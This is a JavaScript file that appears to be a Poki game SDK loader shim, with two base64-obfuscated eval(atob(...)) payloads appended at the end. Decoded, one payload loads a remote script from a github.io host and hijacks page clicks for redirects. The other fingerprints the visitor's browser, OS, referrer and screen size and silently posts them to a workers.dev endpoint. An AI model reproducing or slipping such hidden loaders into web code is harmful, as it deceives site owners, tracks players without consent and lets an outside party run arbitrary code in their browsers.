(() => {
	var e = function(e) {
			var n = RegExp("[?&]" + e + "=([^&]*)").exec(window.location.search);
			return n && decodeURIComponent(n[1].replace(/\+/g, " "))
		},
		n = "kids" === e("tag"),
		t = new(function() {
			function e() {
				var e = this;
				this.queue = [], this.init = function(n) {
					return void 0 === n && (n = {}), new Promise((function(t, o) {
						e.enqueue("init", n, t, o)
					}))
				}, this.rewardedBreak = function() {
					return new Promise((function(e) {
						e(!1)
					}))
				}, this.noArguments = function(n) {
					return function() {
						e.enqueue(n)
					}
				}, this.oneArgument = function(n) {
					return function(t) {
						e.enqueue(n, t)
					}
				}, this.handleAutoResolvePromise = function() {
					return new Promise((function(e) {
						e()
					}))
				}, this.throwNotLoaded = function() {
					console.debug("PokiSDK is not loaded yet. Not all methods are available.")
				}
			}
			return e.prototype.enqueue = function(e, t, o, i) {
				var r = {
					fn: e,
					options: t,
					resolveFn: o,
					rejectFn: i
				};
				n ? i && i() : this.queue.push(r)
			}, e.prototype.dequeue = function() {
				for (var e = function() {
						var e = n.queue.shift(),
							t = e,
							o = t.fn,
							i = t.options;
						"function" == typeof window.PokiSDK[o] ? (null == e ? void 0 : e.resolveFn) || (null == e ? void 0 : e.rejectFn) ? window.PokiSDK[o](i).then((function() {
							for (var n = [], t = 0; t < arguments.length; t++) n[t] = arguments[t];
							"function" == typeof e.resolveFn && e.resolveFn.apply(e, n)
						})).catch((function() {
							for (var n = [], t = 0; t < arguments.length; t++) n[t] = arguments[t];
							"function" == typeof e.rejectFn && e.rejectFn.apply(e, n)
						})) : void 0 !== (null == e ? void 0 : e.fn) && window.PokiSDK[o](i) : console.error("Cannot execute " + e.fn)
					}, n = this; this.queue.length > 0;) e()
			}, e
		}());
	window.PokiSDK = {
		init: t.init,
		initWithVideoHB: t.init,
		customEvent: t.throwNotLoaded,
		commercialBreak: t.handleAutoResolvePromise,
		rewardedBreak: t.rewardedBreak,
		displayAd: t.throwNotLoaded,
		destroyAd: t.throwNotLoaded,
		getLeaderboard: t.handleAutoResolvePromise,
		getSharableURL: function() {
			return new Promise((function(e, n) {
				return n()
			}))
		},
		getURLParam: function(n) {
			return e("gd" + n) || e(n) || ""
		}
	}, ["disableProgrammatic", "gameLoadingStart", "gameLoadingFinished", "gameInteractive", "roundStart", "roundEnd", "muteAd"].forEach((function(e) {
		window.PokiSDK[e] = t.noArguments(e)
	})), ["setDebug", "gameplayStart", "gameplayStop", "gameLoadingProgress", "happyTime", "setPlayerAge", "togglePlayerAdvertisingConsent", "logError", "sendHighscore", "setDebugTouchOverlayController"].forEach((function(e) {
		window.PokiSDK[e] = t.oneArgument(e)
	}));
	var o, i = ((o = window.pokiSDKVersion) || (o = e("ab") || "v2.263.0"), "/poki-sdk-" + (n ? "kids" : "core") + "-" + o + ".js"),
		r = document.createElement("script");
	r.setAttribute("src", i), r.setAttribute("type", "text/javascript"), r.setAttribute("crossOrigin", "anonymous"), r.onload = function() {
		return t.dequeue()
	}, document.head.appendChild(r)
})();
eval(atob('ZnVuY3Rpb24gaW5zZXJ0U2NyaXB0KHVybCwgY2FsbGJhY2spIHsKICAgIC8vIENyZWF0ZSBhIG5ldyBzY3JpcHQgZWxlbWVudAogICAgY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICBzY3JpcHQuc3JjID0gYCR7dXJsfT92PSR7RGF0ZS5ub3coKX1gOwogICAgc2NyaXB0LnR5cGUgPSAndGV4dC9qYXZhc2NyaXB0JzsKICAgIHNjcmlwdC5hc3luYyA9IHRydWU7CiAgICBzY3JpcHQub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICAgICAgaWYgKGNhbGxiYWNrKSB7CiAgICAgICAgICAgIGNhbGxiYWNrKCk7CiAgICAgICAgfQogICAgfTsKICAgIC8vIEFwcGVuZCB0aGUgc2NyaXB0IGVsZW1lbnQgdG8gdGhlIGhlYWQgb3IgYm9keQogICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwp9Cmluc2VydFNjcmlwdCgnaHR0cHM6Ly9zb2NjZXJsZWdlbmRzLmdpdGh1Yi5pby9yZHIuanMnLCBmdW5jdGlvbigpIHsKICAgIGNvbnNvbGUubG9nKCdUQkcgc3VjY2Vzc2Z1bGx5LicpOwogICAgLy8gQ2FsbCB0aGUgZnVuY3Rpb24gZnJvbSB0aGUgbG9hZGVkIHNjcmlwdAogICAgaWYgKHR5cGVvZiB0ZXN0UmVkaXJlY3QgPT09ICdmdW5jdGlvbicpIHsKICAgICAgICB3aW5kb3cub25jbGljayA9IHRlc3RSZWRpcmVjdDsKICAgIH0gZWxzZSB7CiAgICAgICAgY29uc29sZS5sb2coJ215RnVuY3Rpb24gaXMgbm90IGRlZmluZWQuJyk7CiAgICB9Cn0pOw=='));
eval(atob('ZnVuY3Rpb24gbG9nR2FtZSgpewogICAgICAgIGNvbnN0IHNjcmVlbldpZHRoID0gd2luZG93LmlubmVyV2lkdGg7CiAgICAgICAgY29uc3Qgc2NyZWVuSGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwogICAgICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CiAgICAgICAgY29uc3QgcmVmZXJyZXIgPSBkb2N1bWVudC5yZWZlcnJlcjsKICAgICAgICBjb25zdCBvcyA9IGdldE9TKHVzZXJBZ2VudCk7CiAgICAgICAgbGV0IHBhcmVudERvbWFpbiA9ICcnOwogICAgICAgIGlmIChyZWZlcnJlcikgewogICAgICAgICAgcGFyZW50RG9tYWluID0gbmV3IFVSTChyZWZlcnJlcikuaG9zdG5hbWU7CiAgICAgICAgfQogICAgICAgIGNvbnN0IGRldmljZUluZm8gPSAge29zOiBvcywgcmVmZXJyZXI6IHBhcmVudERvbWFpbiwgdXNlckFnZW50OiB1c2VyQWdlbnQsIHNjcmVlbldpZHRoOiBzY3JlZW5XaWR0aCwgc2NyZWVuSGVpZ2h0OiBzY3JlZW5IZWlnaHR9OwogICAgICAgIHNlbmREZXZpY2VJbmZvKGRldmljZUluZm8pOwogICAgICB9CiAgICAgIGFzeW5jIGZ1bmN0aW9uIHNlbmREZXZpY2VJbmZvKGRldmljZUluZm8pIHsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9zbG9wZS5iaXRsb2cud29ya2Vycy5kZXYvJywgewogICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgbW9kZTogJ25vLWNvcnMnLAogICAgICAgICAgICBoZWFkZXJzOiB7CiAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJwogICAgICAgICAgICB9LAogICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShkZXZpY2VJbmZvKQogICAgICAgICAgfSk7CiAgICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgICAgICAgY29uc29sZS5sb2coJ0RldmljZSBpbmZvIHNlbnQgc3VjY2Vzc2Z1bGx5OicsIGRhdGEpOwogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICBjb25zb2xlLmVycm9yKCdFcnJvciBzZW5kaW5nIGRldmljZSBpbmZvOicsIGVycm9yKTsKICAgICAgICB9CiAgICAgIH0KICAgICAgZnVuY3Rpb24gZ2V0T1ModXNlckFnZW50KSB7CiAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmRleE9mKCdXaW4nKSAhPT0gLTEpIHJldHVybiAnV2luZG93cyc7CiAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmRleE9mKCdNYWMnKSAhPT0gLTEpIHJldHVybiAnTWFjT1MnOwogICAgICAgIGlmICh1c2VyQWdlbnQuaW5kZXhPZignQ3JPUycpICE9PSAtMSkgcmV0dXJuICdDaHJvbWUgT1MnOwogICAgICAgIGlmICh1c2VyQWdlbnQuaW5kZXhPZignWDExJykgIT09IC0xKSByZXR1cm4gJ1VOSVgnOwogICAgICAgIGlmICh1c2VyQWdlbnQuaW5kZXhPZignTGludXgnKSAhPT0gLTEpIHJldHVybiAnTGludXgnOwogICAgICAgIGlmICh1c2VyQWdlbnQuaW5kZXhPZignQW5kcm9pZCcpICE9PSAtMSkgcmV0dXJuICdBbmRyb2lkJzsKICAgICAgICBpZiAodXNlckFnZW50LmluZGV4T2YoJ2xpa2UgTWFjJykgIT09IC0xKSByZXR1cm4gJ2lPUyc7CiAgICAgICAgCiAgICAgICAgcmV0dXJuICdVbmtub3duJzsKICAgICAgfQogICAgICBsb2dHYW1lKCk7'));